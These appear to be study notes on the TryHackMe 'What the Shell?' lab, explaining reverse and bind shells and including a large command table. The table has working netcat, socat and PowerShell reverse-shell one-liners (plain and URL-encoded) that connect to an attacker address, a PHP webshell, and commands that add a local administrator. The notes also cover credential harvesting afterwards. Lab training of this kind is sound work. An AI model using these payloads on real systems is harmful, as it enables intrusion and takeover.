# What the Shell?

---

In reviewing the What the Shell material I extracted the core concepts around tools and techniques for obtaining and handling reverse 
and bind shells during exploitation. Netcat functions as the foundational networking utility capable of receiving reverse shells or 
connecting to bind shells on targets though its default shells remain unstable and non-interactive without further work. Socat delivers 
markedly greater stability and flexibility by acting as a versatile connector between endpoints yet requires more intricate command 
syntax and is seldom present by default on distributions while both tools maintain Windows executable variants. Within the Metasploit 
framework the multi/handler module receives reverse shells with extensive options for stability and serves as the sole method for 
interacting with meterpreter shells or managing staged payloads. Msfvenom operates as a standalone payload generator from the same 
framework producing reverse and bind shells on demand along with other formats. Additional resources include the Payloads all the 
Things repository the PentestMonkey Reverse Shell Cheatsheet the SecLists repository and the webshells pre-installed under 
/usr/share/webshells on Kali Linux.

Shells divide into reverse and bind categories at a high level. Reverse shells compel the target to initiate an outbound connection to 
a listener on the attacking machine which bypasses many inbound firewall rules on the target though it can require network 
configuration on the attacker side except within the TryHackMe environment. Bind shells instead start a listener directly on the 
target for the attacker to connect to avoiding attacker-side changes but potentially blocked by target firewalls. Reverse shells tend 
to be simpler to deploy and troubleshoot in practice. Shells further classify as interactive when they support programs requiring user 
input such as SSH prompts or non-interactive when limited to commands that run without interaction leaving most basic reverse or bind 
shells in the latter category and complicating subsequent steps.

Netcat listeners start with the syntax nc -lvnp followed by the port number where the flags specify listening mode verbose output no 
hostname resolution and the port itself with ports below 1024 demanding sudo and well-known ports such as 443 preferred to evade 
outbound firewall restrictions. Bind shell connections simply use nc with the target IP and port. Shell stabilization becomes essential 
after catching a netcat shell due to instability Ctrl+C termination and lack of interactivity stemming from the process running inside
a terminal rather than as a true one. The first method relies on Python which is typically present on Linux targets spawning an enhanced
bash shell setting the TERM variable to xterm and then backgrounding with Ctrl+Z before applying stty raw -echo and foregrounding to 
restore tab completion arrow keys and signal handling. The rlwrap approach prepends the listener for built-in history tab completion and
arrow keys immediately though Linux targets may still need the stty sequence for full Ctrl+C support and proves especially effective 
for otherwise stubborn Windows shells. The third method upgrades an initial netcat shell by transferring a static socat binary to the 
target via a simple web server on the attacker and then executing it to achieve a fully featured shell noting this works only on Linux 
targets.

Socat links two endpoints such as a listening port and standard input or a TTY file with syntax that grows complex yet yields stable 
results. Basic reverse shell listeners use socat TCP-L with the port while targets connect back using EXEC options tailored for 
powershell.exe with pipes on Windows or bash -li on Linux. Bind shell listeners on targets employ similar TCP-L with EXEC while the 
attacker connects via TCP to the target IP and port. A specialized listener configuration creates an immediate full TTY reverse shell 
on Linux targets by directing output to the current TTY file with raw and echo disabled parameters then pairing it with a detailed 
payload command incorporating pty stderr sigint setsid and sane arguments for pseudoterminal allocation error visibility signal 
passthrough new session creation and terminal normalization. Increasing verbosity with -d -d aids troubleshooting when issues arise. 
Encrypted shells replace TCP with OPENSSL after generating a self-signed 2048-bit RSA certificate valid for 362 days via openssl 
merging the key and cert into a pem file and configuring listeners with the certificate and verify disabled to prevent inspection or 
bypass certain detections with the certificate always residing on the listening side.

Common netcat payloads include the -e option for direct execution in compatible versions or named pipe constructions using mkfifo for 
broader compatibility on Linux creating a bidirectional loop with sh. Windows environments frequently use a PowerShell one-liner 
reverse shell that establishes a TCP client reads and executes commands while echoing output back. Msfvenom generation follows the 
pattern msfvenom -p with the payload and options for output format file LHOST and LPORT where LHOST uses the tun0 IP on TryHackMe. 
Payloads distinguish as staged where a small stager downloads the full shellcode on connection requiring multi/handler or stageless 
where the complete code executes immediately. Meterpreter shells deliver built-in stability and post-exploitation features but demand 
capture within Metasploit. Naming conventions use OS/arch/payload with underscores denoting stageless variants and forward slashes for 
staged while Windows 32-bit omits the architecture specifier.

Multi/handler setup begins in msfconsole by selecting the module configuring the matching payload LHOST and LPORT then launching as a 
background job with exploit -j before foregrounding the resulting session. Webshells provide fallback remote code execution when direct
binary uploads fail with a minimal PHP example accepting commands via GET parameters and formatting output in pre tags while the 
PentestMonkey php-reverse-shell offers a full reverse shell variant for Unix targets and URL-encoded PowerShell equivalents suit 
Windows servers. After gaining any shell further access ideally escalates to native methods such as locating SSH keys in user home 
directories credentials in files or the registry adding local administrator accounts via net user and net localgroup commands or 
exploiting issues like Dirty C0w or writable shadow files for cleaner interactive sessions over RDP telnet or similar.

The room supplies two practice boxes for hands-on testing: an Ubuntu server with a web upload page and both netcat and socat installed 
accessible via SSH on port 22 using username shell and password ******** alongside a Windows 2019 Server running XAMPP with the same 
tools and login over RDP or WinRM using username Administrator and password ******** via the xfreerdp command with dynamic resolution 
clipboard support certificate ignore the machine IP and the redacted credentials.

---

| Description | Code/Command |
|-------------|--------------|
| Netcat reverse shell listener example | sudo nc -lvnp 443 |
| Netcat reverse shell from target | nc <LOCAL-IP> <PORT> -e /bin/bash |
| Netcat bind shell listener on Windows target | nc -lvnp <port> -e "cmd.exe" |
| Netcat connection to bind shell | nc MACHINE_IP <port> |
| General netcat listener syntax | nc -lvnp <port-number> |
| Netcat bind shell connection syntax | nc <target-ip> <chosen-port> |
| Python shell upgrade (first stage) | python -c 'import pty;pty.spawn("/bin/bash")' |
| Set terminal type for features like clear | export TERM=xterm |
| Stabilize shell with terminal echo control | stty raw -echo; fg |
| rlwrap-enhanced netcat listener | rlwrap nc -lvnp <port> |
| Simple Python web server for file transfer | sudo python3 -m http.server 80 |
| Download socat binary on Linux target | wget <LOCAL-IP>/socat -O /tmp/socat |
| Download socat binary on Windows target (PowerShell) | Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe |
| Check local terminal rows and columns | stty -a |
| Set rows in reverse/bind shell | stty rows <number> |
| Set columns in reverse/bind shell | stty cols <number> |
| Basic socat reverse shell listener | socat TCP-L:<port> - |
| Socat reverse shell from Windows target | socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes |
| Socat reverse shell from Linux target | socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" |
| Socat bind shell listener on Linux target | socat TCP-L:<PORT> EXEC:"bash -li" |
| Socat bind shell listener on Windows target | socat TCP-L:<PORT> EXEC:powershell.exe,pipes |
| Socat connection to bind shell listener | socat TCP:<TARGET-IP>:<TARGET-PORT> - |
| Specialized socat full TTY listener | socat TCP-L:<port> FILE:`tty`,raw,echo=0 |
| Specialized socat full TTY reverse payload | socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane |
| Generate self-signed certificate for encrypted shells | openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt |
| Merge key and certificate into PEM | cat shell.key shell.crt > shell.pem |
| Socat encrypted reverse shell listener | socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - |
| Socat encrypted reverse shell from target | socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash |
| Socat encrypted bind shell listener on Windows target | socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes |
| Socat encrypted connection to bind shell | socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - |
| Netcat bind shell listener with -e (compatible versions) | nc -lvnp <PORT> -e /bin/bash |
| Netcat reverse shell with -e | nc <LOCAL-IP> <PORT> -e /bin/bash |
| Netcat bind shell using named pipe (no -e) | mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f \| /bin/sh >/tmp/f 2>&1; rm /tmp/f |
| Netcat reverse shell using named pipe | mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f \| /bin/sh >/tmp/f 2>&1; rm /tmp/f |
| PowerShell reverse shell one-liner (replace IP and port) | powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" |
| Msfvenom Windows x64 reverse shell EXE example | msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> |
| Metasploit multi/handler module selection | use multi/handler |
| Set payload in multi/handler | set PAYLOAD <payload> |
| Set listening host in multi/handler | set LHOST <listen-address> |
| Set listening port in multi/handler | set LPORT <listen-port> |
| Launch multi/handler as background job | exploit -j |
| Foreground specific session | sessions 1 |
| Basic PHP webshell example | <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> |
| URL-encoded PowerShell reverse shell for webshell cmd parameter | powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22 |
| Add new user account on Windows | net user <username> <password> /add |
| Add user to administrators group on Windows | net localgroup administrators <username> /add |
| xfreerdp command for Windows practice box (password redacted) | xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'********' |
| Default alias for improved listener (demonstration only) | sudo rlwrap nc -lvnp 443 |

---

### Key Takeaways
- Socat offers superior stability over netcat but carries two main drawbacks: more complex syntax and rare default installation on
  targets.
- Netcat listener flags break down as -l to enable listen mode -v for verbose output -n to disable DNS resolution and -p to specify the
 port.
- Stabilization Technique 1 (Python on Linux): run python -c 'import pty;pty.spawn("/bin/bash")' (adjust to python2 or python3 if needed)
   then export TERM=xterm then background with Ctrl+Z followed by stty raw -echo; fg in the attacker terminal.
- Stabilization Technique 2 (rlwrap): install with sudo apt install rlwrap then use rlwrap nc -lvnp <port> as the listener for immediate
  history tab completion and arrow keys with optional stty raw -echo; fg on Linux for full signal support.
- Stabilization Technique 3 (socat upgrade): serve a static socat binary from the attacker web server download it on target via the
  initial netcat shell then execute the socat reverse or bind command to replace the basic shell.
- Multi/handler procedure: launch msfconsole then type use multi/handler set PAYLOAD to match the generated payload set LHOST and set
  LPORT then run exploit -j and foreground the session with sessions <number> as needed.
- Specialized socat TTY payload arguments include pty to allocate a pseudoterminal stderr to surface errors sigint to pass Ctrl+C sets id for a new session and sane to normalize the terminal.
- Msfvenom payload naming uses OS/arch/payload format where stageless variants employ underscores and staged variants use forward slashes with Windows 32-bit omitting the architecture field.
- Staged payloads split into a small stager that downloads the full shellcode requiring multi/handler while stageless payloads contain
  everything in one self-contained block.
- After obtaining a shell pursue native access methods such as SSH keys at /home/<user>/.ssh stored credentials in the registry or XML
  files adding local accounts with net user and net localgroup or privilege escalation vectors like Dirty C0w or writable /etc/passwd or
  /etc/shadow.

---


